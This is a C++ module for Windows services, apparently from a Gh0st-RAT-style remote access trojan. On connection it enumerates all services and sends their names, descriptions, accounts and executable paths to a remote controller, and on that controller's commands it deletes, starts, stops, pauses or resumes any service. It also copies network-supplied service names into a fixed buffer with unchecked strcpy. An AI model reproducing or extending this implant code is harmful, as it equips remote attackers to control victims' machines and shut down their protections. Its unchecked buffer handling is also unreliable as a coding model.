// ServiceManager.cpp: implementation of the CServiceManager class.
//
//////////////////////////////////////////////////////////////////////

#include "ServiceManager.h"
#include "macros.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CServiceManager::CServiceManager(CClientSocket *pClient) : CManager(pClient)
{
	SendServicesList();

}

CServiceManager::~CServiceManager()
{

}

void CServiceManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
 	switch (lpBuffer[0])
 	{
	case  SERVICE_WIN32:
		SendServicesList(SERVICE_WIN32);
		break;
	case  SERVICE_KERNEL_DRIVER:
		SendServicesList(SERVICE_KERNEL_DRIVER);
		break;
	case COMMAND_DELETESERVERICE:
		DeleteService((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_STARTSERVERICE:  //启动服务
		MyControlService((LPBYTE)lpBuffer + 1,0);
		break;
	case COMMAND_STOPSERVERICE:
		MyControlService((LPBYTE)lpBuffer + 1,1);
		break;
	case COMMAND_PAUSESERVERICE:
		MyControlService((LPBYTE)lpBuffer + 1,2);
		break;
	case COMMAND_CONTINUESERVERICE:
		MyControlService((LPBYTE)lpBuffer + 1,3);
		break;
	default:
		break;
	}
}

void CServiceManager::SendServicesList(DWORD dwScType)
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServiceList(dwScType);
	if (lpBuffer == NULL)
		return;	
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CServiceManager::getServiceList(DWORD dwScType)
{
	LPBYTE	 lpBuffer = NULL;
	DWORD	 dwOffset = 0;
	DWORD	 dwLength = 1024*8;
	char     strState[100], strStartType[100], lpDescription[1024];


	LPENUM_SERVICE_STATUS lpServices    = NULL; 
	SC_HANDLE sc = NULL; 
	SC_HANDLE sh;
	dwServiceType = dwScType;//SERVICE_WIN32 ;//SERVICE_KERNEL_DRIVER;  
	
	DWORD size=0;
	DWORD ret=0;
	
	char* szInfo[1024*8];
	DWORD dwSize=1024*8;
	
	sc=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	
	//第一次调用来得到需要多大的内存区
	EnumServicesStatus(sc,dwServiceType,SERVICE_STATE_ALL,lpServices,size,&size,&ret,NULL);
	//申请需要的内存
	lpServices=(LPENUM_SERVICE_STATUS)LocalAlloc(LPTR,size);
	EnumServicesStatus(sc,dwServiceType,SERVICE_STATE_ALL,lpServices,size,&size,&ret,NULL);
	

	// 申请Buffer内存
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_SERVICE_LIST;
	dwOffset = 1;

	for(DWORD i=0;i<ret;i++)
	{
		dwSize=1024*8;
		ZeroMemory(szInfo,dwSize);

		// 显示名
//		puts(lpServices[i].lpDisplayName);
		
		sh=OpenService(sc,lpServices[i].lpServiceName,SERVICE_ALL_ACCESS);
		if(sh == NULL) //打开失败
			continue;
		
		QueryServiceConfig2(sh,SERVICE_CONFIG_DESCRIPTION,(LPBYTE)szInfo,dwSize,&dwSize);
		// 描述
		memset(lpDescription,0,sizeof(lpDescription));
		if(((LPSERVICE_DESCRIPTION)szInfo)->lpDescription !=NULL)
			lstrcpy(lpDescription,((LPSERVICE_DESCRIPTION)szInfo)->lpDescription);
		

		// 状态
		memset(strState,0,sizeof(strState));
		switch(lpServices[i].ServiceStatus.dwCurrentState)
		{
		case SERVICE_CONTINUE_PENDING:
			lstrcpy(strState,"Continue");
			break;
		case SERVICE_PAUSE_PENDING:
	    	lstrcpy(strState,"Pausing");
			break;
		case SERVICE_PAUSED:
			lstrcpy(strState,"Paused");
			break;
		case SERVICE_RUNNING:
			lstrcpy(strState,"Running");
			break;
		case SERVICE_START_PENDING:
			lstrcpy(strState,"Starting");
			break;
		case SERVICE_STOP_PENDING:
			lstrcpy(strState,"Stopping");
			break;
		case SERVICE_STOPPED:
			lstrcpy(strState,"Stopped");
			break;
        default:
			lstrcpy(strState,"Erro");
			break;
		}
	
		ZeroMemory(szInfo,dwSize);
		dwSize=1024*8;
		QueryServiceConfig(sh,(LPQUERY_SERVICE_CONFIG)szInfo,dwSize,&dwSize);

		// 启动类型
		memset(strStartType,0,sizeof(strStartType));
		switch(((LPQUERY_SERVICE_CONFIG)szInfo)->dwStartType)
		{
		case SERVICE_AUTO_START:
			lstrcpy(strStartType,"Auto Start");
			break;
		case SERVICE_BOOT_START:
			lstrcpy(strStartType,"Boot Start");
			break;
		case SERVICE_DEMAND_START:
			lstrcpy(strStartType,"Demand Start");
			break;
		case SERVICE_DISABLED:
			lstrcpy(strStartType,"Disabled");
			break;
		case SERVICE_SYSTEM_START:
			lstrcpy(strStartType,"System Start");
			break;
		default:
			lstrcpy(strStartType,"Erro");
			break;
		}


		// 服务的启动账户名
//		puts(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName);
		

		// 是否与桌面交互
		char* InterActive = "";
		if(((LPQUERY_SERVICE_CONFIG)szInfo)->dwServiceType >= SERVICE_INTERACTIVE_PROCESS)
			InterActive = "是";

		// 服务名
//		puts(lpServices[i].lpServiceName);

		// 路径
//		puts(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName);

//==========================================================================================
		// 缓冲区太小，再重新分配下
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


		// 显示名称
		memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, lstrlen(lpServices[i].lpDisplayName) + 1);
		dwOffset += lstrlen(lpServices[i].lpDisplayName) + 1;

		// 描述
		memcpy(lpBuffer + dwOffset,lpDescription, lstrlen(lpDescription) + 1);
		dwOffset += lstrlen(lpDescription) + 1;

		// 状态
		memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) + 1);
		dwOffset += lstrlen(strState) + 1;

		// 启动类型
		memcpy(lpBuffer + dwOffset, strStartType, lstrlen(strStartType) + 1);
		dwOffset += lstrlen(strStartType) + 1;

		// 登陆身份
		memcpy(lpBuffer + dwOffset, ((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName, lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName) + 1);
		dwOffset += lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName) + 1;

		// 桌面交互
		memcpy(lpBuffer + dwOffset, InterActive, lstrlen(InterActive) + 1);
		dwOffset += lstrlen(InterActive) + 1;

		// 服务名
		memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, lstrlen(lpServices[i].lpServiceName) + 1);
		dwOffset += lstrlen(lpServices[i].lpServiceName) + 1;

		// 可执行文件路径
		memcpy(lpBuffer + dwOffset, ((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName, lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName) + 1);
		dwOffset += lstrlen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName) + 1;

		// 控制通知

		CloseServiceHandle(sh);
	}
	
	CloseServiceHandle(sc);		

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

						
void CServiceManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //删除服务
{
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	
	char temp[500];
	char *ServerName=NULL;
	strcpy(temp,(char*)(lpBuffer));
	ServerName = temp;
	DWORD _err = 0;
    service=OpenService(scm,ServerName,SERVICE_ALL_ACCESS);
	
	_err = GetLastError();
    BOOL isSuccess=QueryServiceStatus(service,&status);
	
    if ( status.dwCurrentState!=SERVICE_STOPPED )
	{
		isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
	}
	isSuccess=::DeleteService(service);
	CloseServiceHandle(service );
	CloseServiceHandle(scm);
	
	// 稍稍Sleep下，防止出错
	Sleep(100);
	SendServicesList(dwServiceType);
}

void CServiceManager::MyControlService(LPBYTE lpBuffer,UINT nType)  //启动 停止服务
{
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);  // 打开服务管理对象

	service=OpenService(scm,(char*)lpBuffer,SERVICE_ALL_ACCESS);  // 打开www服务
	
    BOOL isSuccess=QueryServiceStatus(service,&status);
	

	switch(nType)
	{
	case 0:
		if ( status.dwCurrentState==SERVICE_STOPPED )  //服务停止状态 就启动服务
		{
			isSuccess=StartService(service,NULL,NULL);
		}
		break;
	case 1:
		if ( status.dwCurrentState !=SERVICE_STOPPED )
		{
			isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
		}
		break;
	case 2:
		if(status.dwCurrentState == SERVICE_RUNNING)
		{
			isSuccess=ControlService(service,SERVICE_CONTROL_PAUSE,&status);
        }
		break;
	case 3:
		if(status.dwCurrentState == SERVICE_PAUSED)
		{
			isSuccess=ControlService(service,SERVICE_CONTROL_CONTINUE,&status);
        }
		break;
	}
	
	CloseServiceHandle(service );
	CloseServiceHandle(scm);
	
	// 稍稍Sleep下，防止出错
	Sleep(100);
	SendServicesList(dwServiceType);
}

